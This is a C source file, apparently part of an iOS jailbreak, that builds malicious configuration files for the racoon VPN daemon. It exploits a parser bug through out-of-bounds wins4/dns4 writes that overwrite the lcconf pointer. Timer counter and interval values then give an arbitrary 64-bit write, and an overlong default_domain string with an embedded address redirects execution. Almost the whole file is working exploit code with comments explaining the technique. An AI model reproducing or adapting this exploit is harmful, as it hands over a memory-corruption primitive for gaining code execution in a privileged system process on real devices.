#include <string.h>
#include <stdio.h>

#include "racoon_www.h"

// we safe back the old high address as an optimization because it doesn't change most of the time between two writes so we don't have to update it
uint32_t oldhigher_lcconf = 0xffffffff; // older value is unknown but we don't write to any address which has all high bits set so we can just set them here and the first time we need it in code we can handle it
uint32_t total_bytes_written = 0;

// get an ip address that when inet_pton parses it gets turned back into the int value in memory (used to basically write the int value in value back to mem)
void get_ip_from_value(char * ip, uint32_t value) {
	snprintf(ip,16,"%u.%u.%u.%u",shiftm(value,0),shiftm(value,8),shiftm(value,16),shiftm(value,24));
}
void get_ip_from_value_int(char * ip, int value) {
	snprintf(ip,16,"%u.%u.%u.%u",shiftm(value,0),shiftm(value,8),shiftm(value,16),shiftm(value,24));
}

// overwrites the lcconf pointer in racoon
// this uses the write what where bug pod2g also used in corona and apple still hasn't fix it (see my talk or his for details on how it works)
void change_lcconf(int fd, offset_struct_t * offsets, uint64_t new_addr) {
	// buffer we will write to the file at some point
	char buf[1024] = "mode_cfg{";
	// write what where template, four times wins4 <random ip> to move the wins pointer oob, one time wins 255.255.255.255 to overwrite the wins4 array index variable with -1
	// wins4%s to overwrite the dns4 array index variable with a negative number to point it to lcconf
	// dns4 to overwrite lcconf
	char * www = "wins41.0.0.7;wins41.0.0.7;wins41.0.0.7;wins41.0.0.7;wins4255.255.255.255;wins4%s;dns4%s;";

	uint32_t lower = new_addr & 0xffffffff;
	uint32_t higher = (new_addr >> 32) & 0xffffffff;

	// overwrite the lower half of the lcconf pointer
	char value_ip[16]; // 255.255.255.255 is max so 16 is always enough
	get_ip_from_value((char*)&value_ip,lower);

	char dns4_array_to_lcconf_distance[16];
	get_ip_from_value_int((char*)&dns4_array_to_lcconf_distance,offsets->dns4_array_to_lcconf / 4);
	
	snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, www, dns4_array_to_lcconf_distance, value_ip);

	// now this is the optimization here, if the value changed we need to update it and then we will add another dns4 below
	if (higher != oldhigher_lcconf) {
		oldhigher_lcconf = higher;
		// with each dns4 write the index moves one array item (32 bit) down, which is perfect for us because now we can just use another dns4 statment to overwrite the higher bits of the lcconf pointer
		// this is an improvment from the python script which saves a hell lot of bytes
		get_ip_from_value((char*)&value_ip,higher);
		snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "dns4%s;",value_ip);
	}
	strcat(buf,"}"); // close the mode_cfg statment
	total_bytes_written += strlen(buf);
	write(fd,buf,strlen(buf)); // write it to the config file
}

// this now uses the yacc parser to write anywhere in process mem
// basically for a timer statment it will deref the lcconf ptr in the globals we overwrote with the write what where primitve above and then write the counter and interval values there
// acorn has a big opimization here:
// by using more than those to values in the struct you can also write more than a 64 bit value to that mem location and we often times need to do that so this would optimize the config file a lot in size and parsing speed
void write_to_lcconf(int fd,uint64_t what) {
	char buf[1024] = "timer{";


	uint32_t lower = what & 0xffffffff;
	uint32_t higher = (what >> 32) & 0xffffffff;
	snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "counter%u;",lower);

	snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "interval%usec;",higher);

	strcat(buf,"}"); // close the padding statment
	total_bytes_written += strlen(buf);
	write(fd,buf,strlen(buf)); // write it to the config file
}

// the main problem here is that an address can contain (and will contain) zero chars so we can't use strlen and strcat
// this is why we have to do the weird strcat and copy below (this also means that we could copy out of bounds so you need to watch out how big you set the offset)
void trigger_exec(int fd,uint32_t padding, uint64_t address) {
	char buf[1024] = "mode_cfg{default_domain\"";
	// add padding (should never reach 100)
	for (int i = 0; i < (padding+8) && i < 100; i++) { // TODO see the TODO below with the 8 here
		strcat(buf,"A");
	}
	void* address_in_buf = (void*)((uint64_t)&buf+strlen(buf)-8); // TODO check if the 8 here should acc be myoffsets.str_buff_offset
	strcat(buf,"\";}");
	int len = strlen(buf);
	memcpy(address_in_buf,&address,8);
	total_bytes_written += len;
	write(fd,buf,len); // write it to the config file
}

// this combines the original bug with the lcconf and makes sure that we never reach the boundary of the racoon buffer so that we don't get interrupted in the middel of it
void www64(int fd,offset_struct_t * offsets, uint64_t where, uint64_t what) {
	// make sure that we don't have writes across page boundaries because we might smash the platform memmove pointer with that write and then the read function that reads in the new buffer uses the memmove and so we jump randomly
	uint32_t current_chunk_size = total_bytes_written % RACOON_YY_BUF_SIZE;
	if ((current_chunk_size + BYTES_PER_WRITE) > RACOON_YY_BUF_SIZE) {
		// add padding
		char tmp[BYTES_PER_WRITE];
		memset(tmp,0x41,BYTES_PER_WRITE-1);
		tmp[0] = '#';
		tmp[BYTES_PER_WRITE-1] = '\n';
		write(fd,tmp,BYTES_PER_WRITE);
		total_bytes_written += BYTES_PER_WRITE;
	}
	change_lcconf(fd,offsets,where-offsets->lcconf_counter_offset);
	write_to_lcconf(fd,what);
}
